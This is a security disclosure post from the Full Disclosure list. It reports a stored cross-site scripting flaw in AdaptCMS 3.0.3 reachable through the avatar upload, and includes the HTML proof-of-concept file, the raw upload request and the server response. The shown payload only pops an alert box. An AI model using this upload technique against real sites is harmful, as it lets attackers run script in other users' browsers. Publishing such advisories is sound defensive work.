---
title: Stored XSS via File Upload - adaptcmsv3.0.3
url: https://seclists.org/fulldisclosure/2025/Jun/8
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:25.063601
---

# Stored XSS via File Upload - adaptcmsv3.0.3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Stored XSS via File Upload - adaptcmsv3.0.3

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 1 Jun 2025 16:11:43 +0100

---

```
# Exploit Title: Stored XSS via File Upload - adaptcmsv3.0.3
# Date: 06/2025
# Exploit Author: Andrey Stoykov
# Version: 3.0.3
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Stored XSS via File Upload #1:

Steps to Reproduce:

1. Login with low privilege user and visit "Profile" > "Edit Your Profile"
```

> ```
> "Avatar"
> ```

```
2. Click on "Choose File" and upload the following file

html-xss.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alert Box Example</title>
    <script>
        // This function will be called when the page loads
        function showAlert() {
            alert("Hello! This is an alert box.");
        }
    </script>
</head>
<body onload="showAlert()">
    <h1>Welcome to the Alert Box Example</h1>
    <p>This page will show an alert box when loaded.</p>
</body>
</html>

// HTTP POST request uploading the XSS file

POST /adaptcms/users/edit HTTP/1.1
Host: 192.168.58.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[...]

[...]
------geckoformboundary5d089e6e18a0e8706d92f371cd6484c4
Content-Disposition: form-data; name="data[User][settings][avatar]";
filename="html-xss.html"
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alert Box Example</title>
    <script>
        // This function will be called when the page loads
        function showAlert() {
            alert("Hello! This is an alert box.");
        }
    </script>
</head>
<body onload="showAlert()">
    <h1>Welcome to the Alert Box Example</h1>
    <p>This page will show an alert box when loaded.</p>
</body>
</html>
------geckoformboundary5d089e6e18a0e8706d92f371cd6484c4
Content-Disposition: form-data; name="data[_Token][fields]"

// HTTP Response

HTTP/1.1 200 OK
Date: Fri, 30 May 2025 20:15:54 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Content-Length: 15400
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

[...]
<img src="/adaptcms/uploads/avatars/1_html-xss.html" class="thumbnail
col-lg-2" alt="" /> <input type="hidden"
name="data[User][settings][old_avatar]" value="1_html-xss.html"
id="UserSettingsOldAvatar"/>    <div class="clearfix"></div>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Stored XSS via File Upload - adaptcmsv3.0.3** *Andrey Stoykov (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")